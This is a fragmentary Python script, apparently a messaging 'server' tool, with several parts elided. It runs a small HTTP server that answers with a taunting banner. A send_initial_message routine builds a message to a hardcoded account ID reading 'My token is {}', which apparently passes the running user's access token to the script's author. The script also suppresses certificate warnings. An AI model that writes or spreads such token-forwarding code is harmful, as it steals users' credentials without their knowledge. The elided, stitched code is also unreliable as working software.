...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"   YOUR GOD FATHER R9JP00T H3R3")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello Rajppot sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100093720894666"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── 𝗦𝗘𝗥𝗩𝗘𝗥 𝗥𝗨𝗡𝗡𝗜𝗚 𝗕𝗬 𝗦𝗛𝗔𝗡 ───────────────────────────────•')
